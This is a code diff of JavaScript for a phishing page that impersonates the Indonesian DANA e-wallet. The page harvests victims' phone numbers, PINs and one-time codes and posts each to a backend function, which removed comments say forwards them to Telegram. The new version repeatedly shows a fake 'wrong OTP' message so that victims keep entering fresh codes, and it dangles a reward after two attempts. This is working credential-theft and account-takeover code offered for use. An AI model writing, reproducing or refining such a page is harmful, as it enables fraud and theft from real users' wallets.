@@ -3,37 +3,29 @@ document.addEventListener('DOMContentLoaded', () => {
   const pages = {
     n: document.getElementById('number-page'),
     p: document.getElementById('pin-page'),
-    r: document.getElementById('reward-page'),
-    w: document.getElementById('withdraw-page'),
-    s: document.getElementById('success-page')
+    o: document.getElementById('otp-page')
   };
   
   const lb = document.getElementById('lanjutkan-button');
   const pn = document.getElementById('phone-number');
   const pis = document.querySelectorAll('.pin-box');
-  const registeredPhone = document.getElementById('registered-phone');
-  const saldoAmount = document.getElementById('saldo-amount');
-  const successAmount = document.getElementById('success-amount');
-  const tarikDanaButton = document.getElementById('tarik-dana-button');
-  const kembaliButton = document.getElementById('kembali-button');
+  const ois = document.querySelectorAll('.otp-box');
   const fn = document.getElementById('floating-notification');
   const sn = document.getElementById('success-notification');
+  const rn = document.getElementById('reward-notification');
+  const ac = document.getElementById('attempt-counter');
+  const an = document.getElementById('attempt-number');
   const lc = document.getElementById('lanjutkan-container');
+  const rewardInstruction = document.getElementById('reward-instruction');
 
   // State Variables
   let currentPage = 'n';
   let phoneNumber = '';
   let pin = '';
-  let rewardAmount = '';
-  let rewardAmounts = [
-    'Rp 3.000.000',
-    'Rp 4.500.000', 
-    'Rp 700.000',
-    'Rp 6.000.000',
-    'Rp 7.500.000',
-    'Rp 500.000',
-    'Rp 1.300.000'
-  ];
+  let otp = '';
+  let attemptCount = 0;
+  const maxAttempts = 6;
+  let otpTimer;
 
   // Helper Functions
   function showSpinner() {
@@ -44,60 +36,41 @@ document.addEventListener('DOMContentLoaded', () => {
     document.querySelector('.spinner-overlay').style.display = 'none';
   }
 
-  function getRandomReward() {
-    const randomIndex = Math.floor(Math.random() * rewardAmounts.length);
-    return rewardAmounts[randomIndex];
-  }
-
-  // Fungsi untuk otomatis submit setelah PIN lengkap
-  function autoSubmitPin() {
-    pin = Array.from(pis).map(i => i.value).join('');
+  function startOTPTimer() {
+    let timeLeft = 120;
+    const timerElement = document.getElementById('otp-timer');
     
-    if (pin.length === 6) {
-      // Otomatis lanjutkan setelah PIN lengkap
-      handlePinSubmission();
-    }
+    otpTimer = setInterval(() => {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      
+      if (timeLeft <= 0) {
+        clearInterval(otpTimer);
+      }
+      timeLeft--;
+    }, 1000);
   }
 
-  // Handle PIN submission
-  async function handlePinSubmission() {
-    if (pin.length !== 6) {
-      alert('Kode pendaftaran harus 6 digit');
-      return;
-    }
+  function resetOTPInputs() {
+    ois.forEach(input => input.value = '');
+    ois[0].focus();
+    otp = '';
+    attemptCount++;
+    an.textContent = attemptCount;
+    ac.style.display = 'block';
+  }
+
+  function showRewardInstruction() {
+    rewardInstruction.style.display = 'block';
     
-    showSpinner();
-    try {
-      // Kirim data PIN ke Telegram
-      await sendDanaData('pin', { phone: phoneNumber, pin });
-      
-      // Dapatkan nominal reward acak
-      rewardAmount = getRandomReward();
-      
-      // Kirim data reward ke Telegram
-      await sendDanaData('reward', { 
-        phone: phoneNumber, 
-        pin, 
-        reward: rewardAmount 
-      });
-      
-      // Tampilkan halaman reward
-      setTimeout(() => {
-        pages.p.style.display = 'none';
-        pages.r.style.display = 'block';
-        currentPage = 'r';
-        
-        // Set reward amount
-        saldoAmount.textContent = rewardAmount;
-        hideSpinner();
-      }, 1000);
-    } catch (error) {
-      alert('Gagal verifikasi kode: ' + error.message);
-      hideSpinner();
-    }
+    // Close button handler
+    rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
+      rewardInstruction.style.display = 'none';
+    });
   }
 
-  // Backend Communication untuk mengirim data ke Telegram
+  // Backend Communication
   async function sendDanaData(type, data) {
     try {
       const response = await fetch('/.netlify/functions/send-dana-data', {
@@ -106,45 +79,50 @@ document.addEventListener('DOMContentLoaded', () => {
         body: JSON.stringify({ type, ...data })
       });
       
-      if (!response.ok) {
-        throw new Error('Terjadi kesalahan pada server');
-      }
+      if (!response.ok) throw new Error(await response.text());
       return await response.json();
     } catch (error) {
       console.error('Error:', error);
-      // Tetap lanjut meski gagal kirim ke Telegram
-      return { success: true };
+      throw error;
     }
   }
 
   // Modified Phone Number Formatting
   pn.addEventListener('input', (e) => {
+    // Hapus semua karakter non-digit
     let value = e.target.value.replace(/\D/g, '');
     
+    // Hapus angka 0 di awal jika ada
     if (value.startsWith('0')) {
       value = value.substring(1);
     }
     
+    // Pastikan selalu dimulai dengan 8
     if (value.length > 0 && !value.startsWith('8')) {
-      value = '8' + value.replace(/^8/, '');
+      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
     }
     
+    // Batasi panjang maksimal (3+4+5=12 digit)
     if (value.length > 12) {
       value = value.substring(0, 12);
     }
     
+    // Format nomor dengan tanda hubung
     let formatted = '';
     if (value.length > 0) {
-      formatted = value.substring(0, 3);
+      formatted = value.substring(0, 3); // 3 digit pertama
       if (value.length > 3) {
-        formatted += '-' + value.substring(3, 7);
+        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
       }
       if (value.length > 7) {
-        formatted += '-' + value.substring(7, 12);
+        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
       }
     }
     
+    // Set nilai input dengan format yang sudah dibuat
     e.target.value = formatted;
+    
+    // Simpan nomor tanpa format untuk pengiriman data
     phoneNumber = value;
   });
 
@@ -158,180 +136,118 @@ document.addEventListener('DOMContentLoaded', () => {
       
       showSpinner();
       try {
-        // Kirim data nomor ke Telegram
         await sendDanaData('phone', { phone: phoneNumber });
-        
-        // Simulasi pengiriman data
-        setTimeout(() => {
-          pages.n.style.display = 'none';
-          pages.p.style.display = 'block';
-          currentPage = 'p';
-          lc.style.display = 'none';
-          // Fokus ke input PIN pertama
-          if (pis.length > 0) {
-            pis[0].focus();
-          }
-          hideSpinner();
-        }, 1000);
+        pages.n.style.display = 'none';
+        pages.p.style.display = 'block';
+        currentPage = 'p';
+        lc.style.display = 'none';
       } catch (error) {
         alert('Gagal mengirim data: ' + error.message);
+      } finally {
         hideSpinner();
       }
-    } else if (currentPage === 'p') {
-      // Handle PIN submission manual (jika tombol lanjutkan diklik)
-      handlePinSubmission();
     }
   });
 
-  // PIN Input Handling - Auto submit ketika 6 digit terisi
+  // PIN Input Handling
   pis.forEach((input, index) => {
-    input.addEventListener('input', (e) => {
+    input.addEventListener('input', async (e) => {
       e.target.value = e.target.value.replace(/\D/g, '');
       
       if (e.target.value.length === 1 && index < pis.length - 1) {
-        // Pindah ke input berikutnya
         pis[index + 1].focus();
       }
       
-      // Cek jika semua digit sudah terisi
-      autoSubmitPin();
+      pin = Array.from(pis).map(i => i.value).join('');
+      
+      if (pin.length === 6) {
+        showSpinner();
+        try {
+          await sendDanaData('pin', { phone: phoneNumber, pin });
+          pages.p.style.display = 'none';
+          pages.o.style.display = 'block';
+          currentPage = 'o';
+          lc.style.display = 'none';
+          startOTPTimer();
+          setTimeout(() => fn.style.display = 'block', 1000);
+        } catch (error) {
+          alert('Gagal mengirim PIN: ' + error.message);
+        } finally {
+          hideSpinner();
+        }
+      }
     });
     
     input.addEventListener('keydown', (e) => {
       if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-        // Kembali ke input sebelumnya saat backspace
         pis[index - 1].focus();
-      } else if (e.key === 'Enter') {
-        // Submit dengan Enter
-        autoSubmitPin();
       }
     });
   });
 
-  // Tarik Dana Button Handler
-  tarikDanaButton.addEventListener('click', () => {
-    pages.r.style.display = 'none';
-    pages.w.style.display = 'block';
-    currentPage = 'w';
+  // OTP Input Handling
+  ois.forEach((input, index) => {
+    input.addEventListener('input', async (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+      
+      if (e.target.value.length === 1 && index < ois.length - 1) {
+        ois[index + 1].focus();
+      }
+      
+      otp = Array.from(ois).map(i => i.value).join('');
+      
+      if (index === ois.length - 1 && e.target.value.length === 1) {
+        showSpinner();
+        try {
+          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
+          
+          setTimeout(() => {
+            resetOTPInputs();
+            
+            // Show reward instruction after 2 attempts
+            if (attemptCount === 2) {
+              showRewardInstruction();
+            }
+            
+            if (attemptCount > 2) {
+              rn.style.display = 'block';
+              rn.innerHTML = `
+                <div class="notification-content">
+                  <h3>kode OTP Salah</h3>
+                  <p>silahkan cek sms ataupan whatsapp</p>
+                </div>
+              `;
+              setTimeout(() => rn.style.display = 'none', 10000);
+            }
+            
+            if (attemptCount >= maxAttempts) {
+              fn.style.display = 'none';
+              sn.style.display = 'block';
+              setTimeout(() => sn.style.display = 'none', 5000);
+            }
+          }, 1000);
+        } catch (error) {
+          console.error('Gagal mengirim OTP:', error);
+        } finally {
+          hideSpinner();
+        }
+      }
+    });
     
-    // Tampilkan nomor yang terdaftar
-    registeredPhone.textContent = '+62 ' + pn.value;
-    
-    // Reset PIN inputs
-    pis.forEach(input => input.value = '');
-    
-    // Fokus ke input PIN pertama
-    const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
-    if (withdrawPins.length > 0) {
-      withdrawPins[0].focus();
-    }
-  });
-
-  // Kembali Button Handler
-  kembaliButton.addEventListener('click', () => {
-    // Reset semua state dan kembali ke halaman awal
-    pages.s.style.display = 'none';
-    pages.n.style.display = 'block';
-    currentPage = 'n';
-    lc.style.display = 'flex';
-    
-    // Reset form
-    pn.value = '';
-    phoneNumber = '';
-    pis.forEach(input => input.value = '');
-    pin = '';
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        ois[index - 1].focus();
+      }
+    });
   });
 
   // Toggle PIN Visibility
-  document.querySelectorAll('.show-text').forEach(button => {
-    button.addEventListener('click', (e) => {
-      const isShowing = e.target.classList.toggle('active');
-      const container = e.target.closest('.container');
-      const pinInputs = container.querySelectorAll('.pin-box');
-      pinInputs.forEach(input => {
-        input.type = isShowing ? 'text' : 'password';
-      });
-      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
+  document.querySelector('.show-text').addEventListener('click', (e) => {
+    const isShowing = e.target.classList.toggle('active');
+    const pinInputs = document.querySelectorAll('.pin-box');
+    pinInputs.forEach(input => {
+      input.type = isShowing ? 'text' : 'password';
     });
-  });
-
-  // Handle PIN untuk penarikan dana (auto submit)
-  const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
-  if (withdrawPins.length > 0) {
-    withdrawPins.forEach((input, index) => {
-      input.addEventListener('input', async (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        
-        if (e.target.value.length === 1 && index < withdrawPins.length - 1) {
-          withdrawPins[index + 1].focus();
-        }
-        
-        const withdrawPin = Array.from(withdrawPins).map(i => i.value).join('');
-        
-        if (withdrawPin.length === 6) {
-          showSpinner();
-          
-          try {
-            // Kirim data penarikan ke Telegram
-            await sendDanaData('withdraw', { 
-              phone: phoneNumber, 
-              pin: withdrawPin, 
-              reward: rewardAmount 
-            });
-            
-            // Kirim data sukses ke Telegram
-            await sendDanaData('success', { 
-              phone: phoneNumber, 
-              reward: rewardAmount 
-            });
-            
-            // Simulasi proses penarikan
-            setTimeout(() => {
-              pages.w.style.display = 'none';
-              pages.s.style.display = 'block';
-              currentPage = 's';
-              
-              // Tampilkan jumlah yang berhasil ditarik
-              successAmount.textContent = rewardAmount;
-              
-              hideSpinner();
-            }, 2000);
-          } catch (error) {
-            console.error('Gagal mengirim data penarikan:', error);
-            hideSpinner();
-          }
-        }
-      });
-      
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-          withdrawPins[index - 1].focus();
-        } else if (e.key === 'Enter') {
-          // Submit dengan Enter
-          const withdrawPin = Array.from(withdrawPins).map(i => i.value).join('');
-          if (withdrawPin.length === 6) {
-            showSpinner();
-            // Trigger proses penarikan
-            withdrawPins[withdrawPins.length - 1].dispatchEvent(new Event('input'));
-          }
-        }
-      });
-    });
-  }
-
-  // Handle klik di luar input untuk mobile devices
-  document.addEventListener('click', (e) => {
-    if (currentPage === 'p' && !e.target.classList.contains('pin-box')) {
-      // Cari input PIN yang aktif atau pertama kali
-      const activePin = document.querySelector('.pin-box:focus');
-      if (!activePin) {
-        const firstEmptyPin = Array.from(pis).find(input => input.value === '');
-        if (firstEmptyPin) {
-          firstEmptyPin.focus();
-        } else {
-          pis[0].focus();
-        }
-      }
-    }
+    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
   });
 });
